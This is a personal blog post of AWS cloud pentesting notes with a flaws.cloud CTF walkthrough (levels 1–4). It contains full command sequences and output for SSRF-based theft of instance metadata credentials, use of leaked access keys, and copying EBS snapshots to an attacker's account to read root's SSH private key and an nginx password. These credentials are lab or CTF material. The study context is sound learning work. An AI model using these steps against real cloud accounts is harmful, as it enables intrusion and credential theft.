---
layout: single
title:  "Testing pens in heaven"
header:
  overlay_image: /assets/images/banner.jpg
  show_overlay_excerpt: false
---


## Index

1. [Pentesting cloud environments](#pentesting-cloud-environments)
   - [The plan](#the-plan)
   - [Other links](#other-links)
2. [Introductory material](#introductory-material)
   - [Introduction to cloud pentesting](#introduction-to-cloud-pentesting)
   - [AWS penetration testing](#aws-penetration-testing)
3. [CTFs and hands-on material](#ctfs-and-hands-on-material)
   - [flaws.cloud](#flawscloud)
     - [Level 1](#level-1)
     - [Level 2](#level-2)
     - [Level 3](#level-3)
     - [Level 4](#level-4)
     - [Level 5](#level-5)
     - [Level 6](#level-6)
   - [flaws2.cloud (attacker path)](#flaws2cloud-attacker-path)
     - [Level 1](#level-1-1)
     - [Level 2](#level-2-1)
     - [Level 3](#level-3-1)
   - [pwnedlabs.io](#pwnedlabsio)
   - [Hack The Box Fortress: AWS](#hack-the-box-fortress:-aws)

   

# Pentesting cloud environments

It seems there aren't many resources on cloud pentesting, so I decided to take matters into my own hands. I aggregated the best free resources I could find. Any CTFs or practical exercises I complete will be documented, along with any notes I take on theoretical material. They are not very organized, but this is meant to be a I-know-I-did-this-before-let-me-just-CTRL-F-my-notes type of resource. I'll be focusing on AWS.

It's funny how I went through the beginner stages all over again, stressing out about not understanding the logic of things, having those a-ha! moments, wondering how I'll be able to remember all of this, and much more. If you're feeling the same way with anything in your life, it means your pushing yourself out of your comfort zone. Keep going!

For a slightly more readable version, read this post <a href="https://github.com/BrunoCaseiro/brunocaseiro.github.io/blob/master/_posts/2025-10-04-Testing-pens-in-heaven.md">here</a>


## The plan

* Introductory material
  * <a href="https://www.hackthebox.com/blog/intro-cloud-pentesting">Introduction to Cloud Pentesting</a>
  * <a href="https://www.hackthebox.com/blog/aws-pentesting-guide">AWS penetration testing</a>

* CTFs and hands-on material
  * <a href="http://flaws.cloud/">flaws.cloud</a>
  * <a href="http://flaws2.cloud/">flaws2.cloud</a> (attacker path)
  * <a href="https://pwnedlabs.io/">pwnedlabs.io</a> (AWS, red, free)
  * <a href="https://app.hackthebox.com/fortresses/7">HTB Fortress: AWS</a>

## Other links

* Cheatsheets and references
  * <a href="https://docs.aws.amazon.com/cli/latest/reference/#cli-aws">AWS CLI Documentation</a>
  * <a href="https://hackingthe.cloud/">Hacking The Cloud</a>
  * <a href="https://cloud.hacktricks.wiki/en/index.html">HackTricks Cloud</a>
  * <a href="https://github.com/kh4sh3i/cloud-penetration-testing">kh4sh3i's Cloud pentesting cheatsheet</a>

* Tools
  * <a href="https://github.com/NetSPI/aws_consoler">AWS Consoler: Convert CLI credentials into console access</a>
  * <a href="https://github.com/shabarkin/aws-enumerator">aws-enumerator: Service enumeration</a>
  * <a href="https://github.com/zer1t0/awsenum">awsenum: Enumerate AWS permissions and resources</a>
  * <a href="https://github.com/andresriancho/enumerate-iam">Enumerate IAM: Enumerate permissions associated with a credential set</a>
  * <a href="https://github.com/prowler-cloud/prowler">Prowler: Perform automatic security assessment</a>
  * <a href="https://github.com/nccgroup/ScoutSuite">Scout Suite: Highlights risk areas from gathered configuration data</a>


<br>

# Introductory material
## Introduction to cloud pentesting
* The most common cloud security problems are excessive permissions and several kinds of misconfigurations such as ignoring default settings, exposing sensitive data or simply misunderstanding how things work
* A major problem is publicly exposing S3 buckets, there are "search engines" for publicly accessible data in the cloud such as <a href="https://buckets.grayhatwarfare.com/">GrayHat Warfare</a>

<br>

* Try to interact with any S3 buckets you find, for example `https://megabank-supportstorage.s3.amazonaws.com/index-3-1-1144x912.jpg`
  * List files with `aws s3 ls s3://megabank-supportstorage --recursive`
  * Download files (recursively) with `aws s3 sync s3://megabank-supportstorage/pentest_report/ --recursive`

<br>

* **Compute Instance Metadata** is a cloud service which provides administrative endpoints, it's usually bound to the internal IP `169.254.169.254`
* **IMDSv2** will require token authentication to call these endpoints, but not the default **IMDSv1**
* Especially useful when exploiting an SSRF vulnerability, such as `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/`, this will reveal metadata values

<p align="center">
  <img src="https://github.com/user-attachments/assets/264b0f02-be76-413b-9eaa-850347dd32d3" />
</p>

* Browsing to .../iam/info with the endpoint `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/info`

<p align="center">
  <img src="https://github.com/user-attachments/assets/7c4bee36-fbac-4cf5-88c6-a3c9843dab56" />
</p>

* Fetch the credentials attached to the EC2 instance with `http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/support`, which reveals the `AccessKeyId`, `SecretAccessKey` and an AWS STS token.
<p align="center">
  <img src="https://github.com/user-attachments/assets/c0baf073-60af-44e6-b13c-a4b05f469e3d" />
</p>

* Use `aws configure` to use these credentials, which will save them to `~/.aws/credentials`
* For the session token, use `aws configure set aws_session_token <token>`
* Check current identity and privileges, respectively, with `aws sts get-caller-identity` and `aws iam list-attached-user-policies --user-name support`

<br>

* **S3 buckets** and **Azure/GCP storage buckets** are low hanging fruit but can contain SSH keys, passwords or other sensitive information that might help infiltrate the target (similar to an FTP server if you will)
* Privilege escalation within a cloud service can be useful, not just in the cloud environment as a whole

## AWS penetration testing
Similar to other types of penetration testing, the scoping process should include questions such as:
* How many non-standard AWS IAM policies exist?
* Which services are used?
* How many IAM policies are assigned?
* How many accounts exist?

Keep the **Shared Responsibility Model** in mind: security of the cloud is AWS's responsiblity, security in the cloud is the customer's responsibility

Remember AWS's <a href="https://aws.amazon.com/security/penetration-testing/">policy for penetration testing</a>

<br>

Start by **identifying the attack surface**, determining which services are:
* Used by the application
* Externally exposed
* Managed by AWS or by the customer

Also **enumerate** and **fingerprint** the cloud infrastructure for used components and third-party software. Just like in a web or infra penetration test. **AWS Identity and Access Management (IAM)** can be an interesting source of information

<br>

A few **AWS-specific reconnaissance techniques**:
* Searching the AWS Marketplace for the target organization as the account ID may be disclosed
* Brute-forcing the account ID via the AWS Sign-In URL: `https://<accountid>.signin.aws.amazon.com`
* Searching through public snapshots (i.e EBS snapshots) or AMI Images

<br>

Regarding the **local filesystem**, other tasks besides the usual non-cloud checks are:
* Discovery of AWS Access Credentials in home directories and application files
* Verifying access to the **AWS metadata enpoint** at `https://169.254.169.254/` or `http://[fd00:ec2::254]`

<br>

**AWS Security Tokens** provide temporary, limited-privilege access directly for AWS IAM users or within AWS services. This poses the risk that an attacker could re-use these tokens

Credentials can be requested via the **AWS metadata service** (see above), which holds different kinds of information split into different categories. The most interesting ones are:
* **iam/info**, containing information about associated IAM roles
* **iam/security-credentials/role-name**, containing temporary security credentials associated with the role

If **Metadata Service Version 2 (IMDSv2)** is used, a token must be crafted. This prevents simple SSRF attacks. But if a user is compromised, you might be able to request an API token from the metadata service 
```
[www-data@manager ~]$ TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

[www-data@manager ~]$ echo $TOKEN
AQAAAPjZig94ZtF4xhBwgAATxNGTMMY5Xx6Bu2Hs2Fqp-St5WebEqQ==

[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document
{
  "accountId" : "124253853813",
  "architecture" : "x86_64",
  "availabilityZone" : "eu-central-1a",
  "billingProducts" : null,
  "devpayProductCodes" : null,
  "marketplaceProductCodes" : null,
  "imageId" : "ami-0c0d3776ef525d5dd",
  "instanceId" : "i-067fa056e678575c6",
  "instanceType" : "t2.micro",
  "kernelId" : null,
  "pendingTime" : "2023-02-21T10:30:41Z",
  "privateIp" : "172.31.17.24",
  "ramdiskId" : null,
  "region" : "eu-central-1",
  "version" : "2017-09-30"
}
```

The token can then be used for more juicy requests to the service
```
[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info
{
  "Code" : "Success",
  "LastUpdated" : "2023-02-21T10:30:44Z",
  "InstanceProfileArn" : "arn:aws:iam::124253853813:instance-profile/ServerManager",
  "InstanceProfileId" : "AIPAWA6NVTVY3D6FKNVMM"
}

[www-data@manager ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ServerManager
{
  "Code" : "Success",
  "LastUpdated" : "2023-02-21T10:30:16Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAWA6NVTVYRAJE4MWO",
  "SecretAccessKey" : "DvwdhlDdP13AnTPSgkk5LpToQSQGehcA3JK94gAG",
  "Token" : "IQoJb3JpZ2luX2VjECMaDGV1LWNl.....
  "Expiration" : "2023-02-21T17:05:44Z"
}
```

To leverage the extracted secrets in the AWS CLI, fill in **~/.aws/credentials**

```
[default]
aws_access_key_id = ASIAWA6NVTVY5CNUKIUO
aws_secret_access_key = wSHLoJrGVnjfo+xxKwt1cblFpiZgWF20DMxXpTXn
aws_session_token = IQoJb3JpZ2luX2VjECEaDGV1LWNl......
```
<br>

Moving on to the enumeration of **AWS Security Token Permission**, below is a way to first check if the credentials are valid, and then check if the user has permissions to run **iam:list-attached-role-policies**

```
[www-data@manager ~]$ aws sts get-caller-identity
{
    "Account": "124253853813", 
    "UserId": "AROAWA6NVTVY4Q3ND6536:i-067fa056e678575c6", 
    "Arn": "arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6"
}

[www-data@manager ~]$ aws iam list-attached-role-policies --role-name ServerManager
An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6 is not authorized to perform: iam:ListAttachedRolePolicies on resource: role ServerManager because no identity-based policy allows the iam:ListAttachedRolePolicies action
```

Permissions can be bruteforced with <a href="https://github.com/andresriancho/enumerate-iam">enumerate-iam</a>. **dynamodb:describe_endpoints** is <a href="https://docs.aws.amazon.com/timestream/latest/developerguide/Using-API.endpoint-discovery.how-it-works.html">a false positive</a>, but the credentials do have access to **ec2:DescribeVolumes** and **ec2:CreateSnapshot** (I don't understand how we know about the latter from the output 🤔)

```
[www-data@manager enumerate-iam-master]#./enumerate-iam.py --access-key ACCESS_KEY --secret-key SECRET_KEY --session-token SESSION_TOKEN
2023-02-23 14:10:27,443 - 3545 - [INFO] Starting permission enumeration for access-key-id "ASIAWA6NVTVYRAJE4MWO"
2023-02-23 14:10:28,083 - 3545 - [INFO] -- Account ARN : arn:aws:sts::124253853813:assumed-role/ServerManager/i-067fa056e678575c6
2023-02-23 14:10:28,084 - 3545 - [INFO] -- Account Id  : 124253853813
2023-02-23 14:10:28,084 - 3545 - [INFO] -- Account Path: assumed-role/ServerManager/i-067fa056e678575c6
2023-02-23 14:10:28,933 - 3545 - [INFO] Attempting common-service describe / list brute force.
2023-02-23 14:10:35,937 - 3545 - [INFO] -- dynamodb.describe_endpoints() worked!
2023-02-23 14:10:36,799 - 3545 - [INFO] -- sts.get_caller_identity() worked!
2023-02-23 14:10:43,106 - 3545 - [INFO] -- ec2.describe_volumes() worked!
```

<br>

Time to **escalate privileges**. An attack path with these privileges is to first list available volumes of the EC2 machines (**ec2:DescribeVolumes**) and then create a publicly available snapshot (**ec2:CreateSnapshot**) of the volume. If a volume is publicly available, this means another AWS user can spin up an EC2 instance and attach the snapshot to their own machine as a second hard drive

```
[www-data@manager ~]$ aws ec2 describe-volumes
{
    “Volumes”: [
        {
            “AvailabilityZone”: “eu-central-1a”, 
            “Attachments”: [
                {
                    “AttachTime”: “2023-02-21T06:58:45.000Z”, 
                    “InstanceId”: “i-067fa056e678575c6”, 
                    “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
                    “State”: “attached”, 
                    “DeleteOnTermination”: true, 
                    “Device”: “/dev/xvda”
                }
            ], 
            “Encrypted”: false, 
            “VolumeType”: “gp2”, 
            “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
            “State”: “in-use”, 
            “Iops”: 100, 
            “SnapshotId”: “snap-01c4670c36a9740ea”, 
            “CreateTime”: “2023-02-21T06:58:45.361Z”, 
            “MultiAttachEnabled”: false, 
            “Size”: 8
        }
    ]
}
```
Note the `VolumeID` to create a snapshot of it later
```
[www-data@manager ~]$ aws ec2 create-snapshot –volume-id vol-02ca4df63c5cbb8c5 –description ‘Y-Security rocks!’
{
    “Description”: “Y-Security rocks!”, 
    “Tags”: [], 
    “Encrypted”: false, 
    “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
    “State”: “pending”, 
    “VolumeSize”: 8, 
    “StartTime”: “2023-02-21T10:40:05.770Z”, 
    “Progress”: “”, 
    “OwnerId”: “124253853813”, 
    “SnapshotId”: “snap-06eedc6a7403eda54”
}
```

When creating a new instance in the same region, the snapshot can be found by searching by the `OwnerID`

<p align="center">
  <img src="https://github.com/user-attachments/assets/ac941322-2ecb-4fe4-a21f-5597ad412f59" width="40%">
</p>


After launching the instance, mount the snapshot and access the filesystem to steal root's SSH private key

```
[ec2-user@ip-172-31-31-6 ~]$ sudo mount /dev/sdb1 /media/

[ec2-user@ip-172-31-31-6 ~]$ sudo ls /media/root/.ssh
authorized_keys  id_rsa  id_rsa.pub

[ec2-user@ip-172-31-31-6 ~]$ sudo cat /media/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEApNvZpkpiPqs6vdoGUXTfnv/ZtS0jk8rOrwi+3B8Kg7D4B4Yx
m31QJGD2t8RUEyjlrqpvoQ5tiq+s0xmxZzBioB2mFTzqV0DzyIZ3+zCHKn07tw26
N+67bWq88LTIHbadUfBiKRg4M9GnX8p1R2n2e9gIIxkBVBEQFmqMuVpg/3Yczww1
9MrpMHEEr0fJWbIr9Sc+1x+smZiJjAvgqGa2GZh0SLv05aVuXOGlpemx2CnFMGM/
9bisIRRgKQCMJqYh/cXf69qv9VL0CLHYh1TdSN87ZnWZeb/KNKd5iETTg5s2C6Jj
13NnNrea+GNYr3xLCUqACFQik1HVTH4ZPLJmvwIDAQABAoIBAB05pDHoidYWQMmb
NveFwobLUGrf36i5kT5STJN1JUYHP1EGJxEre+OXFOWq9kSXQXBfYn6osh6d2gNq
UJq8Zx9/YgvtypVBPHZV8DsldTDBFq7yzgpQVgWloG0Df15VGzqFZMFoO75j8kn2
+Cd6z2lQ+NBQBH5EsBdpOB07umpO2xmPbaBYa51+bFeRjvV8qhf01RrbovwrbeWr
qsr4aUgaOBpvIyszFM+q5ZkBAugLeYyPvKP3/fpEWtgIq4L+0Sch75srQ/ahYLQe
dQjGi0BTCqwWvoglHfID76r6jPSovyLKGY5wGlgUTSouHCEoAVkSsWb2vd/5IUns
ISx5ifECgYEA07vqFKyI1RenI5ZehH9l4uKXAH5bysibK4mkR7WSzKmP26cpkaib
NRqB+EaZlUHHnI+ZkGYxh/DKrCo888DDiS/W7zA0muqcBpU3tInDHYdKa9s2wkL+
lYytWVaVFTHN19omAQRlGaNxtJ8jBe9Nd1+sIMpvKoIkFqRfVX0asxsCgYEAx1Mn
nNBulvDy6WHvx5WDg4oD/ajSvKuFfyAd/bi3s6lVwejv6XeDxGoWOr/mZAuDCyUO
aGUTMhCYNedUavg7nTZl9LgPVuJROs3h2toaRqJJE8hh/per38DVuzXpkGqes+s2
OD3MwR8itHOIXsD5I5S6kOpsa5oJXAzJr672cS0CgYBDa16J3rZjQ/jQeBz4i6hh
qkzyt0l7NI1UO6u3ubVYvdU01/GAk/N34UzpRXG5+Qwaag83z5KN+rpOP9TQuNyK
XlVOLEdT3Mh5wCHQtt0OFfo4hcDV8ocmD3lTLSKjcQxeYvQe9stKcqTOIq4AQcak
8C3a8xqaqn3bR9OjYQaTaQKBgQCcNO62ViJU6D915uqi3ulSDLdT8xo0Abd9CQ53
6GsOwYYTkRlzPdZl9z20jO9hOCRad4/zAEMq2RZwJ/pgWmldq2P7hMOAs5w1GWQG
vyYYdNYQStmBTBvGHrlhHb8NDoGRPqQfL09niZ8JDAGzQEf/Om97YjvVl8H+AYeN
xvAbgQKBgQCAji3zHMwRlh3J2az/vfIY79c1uerNMCNBsFrLH5e9D8Cx+Tq+mWiA
WjGvoMRN0a/mxpqX1WyPDEuwNoT547VnXNo2fKsZjsvqmjMGg5wFh4ERhFczb6gg
+0NbI8C71hiJMqDrYSvax4augU617PfzpR63PIWGxcc8oQe3L6F+kQ==
-----END RSA PRIVATE KEY-----
```

<br>

# CTFs and hands-on material
## flaws.cloud

This one was great. Simple, minimal setup and slowly introduces each concept. You'll learn so much from such small challenges! Definitely worth your time 

```
Scope: Everything is run out of a single AWS account, and all challenges are sub-domains of flaws.cloud.
```

### Level 1
```
This level is *buckets* of fun. See if you can find the first sub-domain.
```

Checking if the website is hosted in an S3 bucket
```
┌──(kali㉿kali)-[~]
└─$ nslookup flaws.cloud                                           
Server:         10.0.2.3
Address:        10.0.2.3#53

Non-authoritative answer:
Name:   flaws.cloud
Address: 52.92.152.19
<snip>
                             
┌──(kali㉿kali)-[~]
└─$ nslookup 52.92.152.19
19.152.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
```

And trying to list files inside the S3 bucket. Note how to `--no-sign-request` signals we're trying to access the bucket as an anonymous user
```
┌──(kali㉿kali)-[~]
└─$ aws s3 ls flaws.cloud                             
Unable to locate credentials. You can configure credentials by running "aws configure".
                                                                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ aws s3 ls flaws.cloud --no-sign-request
2017-03-13 22:00:38       2575 hint1.html
2017-03-02 22:05:17       1707 hint2.html
2017-03-02 22:05:11       1101 hint3.html
2024-02-21 20:32:41       2861 index.html
2018-07-10 11:47:16      15979 logo.png
2017-02-26 19:59:28         46 robots.txt
2017-02-26 19:59:30       1051 secret-dd02c7c.html
```

Curling the secret file, level 1 is solved
```
┌──(kali㉿kali)-[~]
└─$ curl flaws.cloud/secret-dd02c7c.html
<snip>
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>

Level 2 is at <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</a> 
```
<br>

### Level 2
```
The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.
```

Using the same technique works to verify that it is indeed an S3 bucket
```
┌──(kali㉿kali)-[~]
└─$ nslookup level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud       
Server:         10.0.2.3
Address:        10.0.2.3#53

Non-authoritative answer:
Name:   level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
Address: 52.92.164.11

<snip>                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nslookup 52.92.164.11                                       
11.164.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
```

But anonymous access doesn't work like before. This will require setting up an AWS account and configuring the credentials with the `aws configure` command. This should be more or less straight forward

I did run into a problem - `An error occurred (SignatureDoesNotMatch) when calling the GetCallerIdentity operation` - which I believe is related to my Kali's messed up timezone. I play a lot of CTFs and sometimes I have to synchronize my clock with different Kerberos servers. I solved this with `sudo timedatectl set-ntp true`

Anyway, after setting up the credentials, the same command will work since it automatically assumes the AWS profile

```
┌──(kali㉿kali)-[~/.aws]
└─$ aws s3 ls level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud  
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/.aws]
└─$ curl level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
<snip>
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>


Level 3 is at <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</a>
```

<br>

### Level 3

```
The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.
```

Once again confirming we're working with an S3 bucket...
```
┌──(kali㉿kali)-[~/.aws]
└─$ nslookup level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
Server:         10.0.2.3
Address:        10.0.2.3#53

Non-authoritative answer:
Name:   level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
<snip>
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/.aws]
└─$ nslookup 52.92.238.91                                       
91.238.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
```
And listing the files works again. Note how this is a git directory
```
┌──(kali㉿kali)-[~/.aws]
└─$ aws s3 ls level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt

```
After downloading the entire bucket and running the command `git log` to see commit history, it seems like Scott committed something interesting by accident
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .             
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to .git/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/config to .git/config
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/description to .git/description
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to .git/COMMIT_EDITMSG
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to .git/hooks/post-update.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-applypatch.sample to .git/hooks/pre-applypatch.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/applypatch-msg.sample to .git/hooks/applypatch-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-rebase.sample to .git/hooks/pre-rebase.sample
<snip>

┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ git log  
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```
To see what was committed by accident, use `git checkout` followed by the hash token. We got access keys!
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
M       index.html
Previous HEAD position was b64c8dc Oops, accidentally added something I shouldn't have
HEAD is now at f52ec03 first commit
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ ls -alh
total 164K
drwxrwxr-x 3 kali kali 4.0K Oct  9 12:49 .
drwxr-xr-x 3 kali kali 4.0K Oct  9 12:45 ..
drwxrwxr-x 7 kali kali 4.0K Oct  9 12:49 .git
-rw-rw-r-- 1 kali kali   91 Oct  9 12:49 access_keys.txt
-rw-rw-r-- 1 kali kali 121K Feb 26  2017 authenticated_users.png
-rw-rw-r-- 1 kali kali 1.6K Feb 26  2017 hint1.html
-rw-rw-r-- 1 kali kali 1.4K Feb 26  2017 hint2.html
-rw-rw-r-- 1 kali kali 1.3K Feb 26  2017 hint3.html
-rw-rw-r-- 1 kali kali 1.1K Feb 26  2017 hint4.html
-rw-rw-r-- 1 kali kali 1.9K May 22  2020 index.html
-rw-rw-r-- 1 kali kali   26 Feb 26  2017 robots.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ cat access_keys.txt 
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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
```

Use `aws configure` to configure a new profile with the stolen keys, followed by a call to the S3 service to list buckets we now have access to
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws s3 ls --profile pwned                                              
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

Obviously hacker-me immediately tried browsing to levels 5 and 6, but that won't work :p 

<br>

### Level 4

```
For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.
```
Sounds like we'll be stealing and loading someone else's snapshot.
First gathering some information about the bucket and the hijacked user
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ host 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud is an alias for ec2-54-202-228-246.us-west-2.compute.amazonaws.com.
ec2-54-202-228-246.us-west-2.compute.amazonaws.com has address 54.202.228.246
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws sts get-caller-identity --profile pwned                                                   
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```
With the region and the user ID, it's now possible to call `ec2 describe-snapshot`. The next command shows how anyone can create volumes from this snapshot. In other words, the snapshot is public
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws ec2 describe-snapshots --profile pwned --owner-id 975426262029 --region us-west-2         
{
    "Snapshots": [
        {
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard",
            "TransferType": "standard",
            "CompletionTime": "2017-02-28T01:37:07+00:00",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "VolumeId": "vol-04f1c039bc13ea950",
            "State": "completed",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "Progress": "100%",
            "OwnerId": "975426262029",
            "Description": "",
            "VolumeSize": 8,
            "Encrypted": false
        }
    ]
}

┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile pwned --region us-west-2
{
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ]
}
```

I can now create a volume in my own account from the public snapshot. Note how I didn't specify a profile since it defaults to my own account
```
┌──(kali㉿kali)-[~/Desktop/bucket]
└─$ aws ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89         
{
    "Iops": 100,
    "Tags": [],
    "VolumeType": "gp2",
    "MultiAttachEnabled": false,
    "VolumeId": "vol-027133a97079dd855",
    "Size": 8,
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "AvailabilityZone": "us-west-2a",
    "State": "creating",
    "CreateTime": "2025-10-09T18:01:18+00:00",
    "Encrypted": false
}
```

I won't add the screenshots here, but the next step is to create an EC2 instance and attach this volume to it. You can create an instance by browsing to EC2 > Launch Instance

And you can attach the volume by browsing to EC2 > Volumes > Actions > Attach Volume

NOTE: I'm using a shared account and don't have permissions on us-west-2a, so I had to copy the public snapshot to the region I can work on (us-east-1), create the volume again, and  proceed from there

SSH into your EC2 instance, check available blocks and mount the target volume
```
[bruno@ip-172-31-47-188 ~]$ lsblk
NAME          MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS
nvme0n1       259:0    0   8G  0 disk 
├─nvme0n1p1   259:1    0   8G  0 part /
├─nvme0n1p127 259:2    0   1M  0 part 
└─nvme0n1p128 259:3    0  10M  0 part /boot/efi
nvme1n1       259:4    0   8G  0 disk 
└─nvme1n1p1   259:5    0   8G  0 part 
[bruno@ip-172-31-47-188 ~]$ sudo mount /dev/nvme1n1p1 /mnt
[sudo] password for bruno:
[bruno@ip-172-31-47-188 ~]$
```

After some digging around, just like during local privilege escalation, credentials were found
```
[bruno@ip-172-31-47-188 ubuntu]$ pwd
/mnt/home/ubuntu
[bruno@ip-172-31-47-188 ubuntu]$ cat setupNginx.sh 
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

The initial link redirected to a login page, so these credentials will work there!

<p align="center">
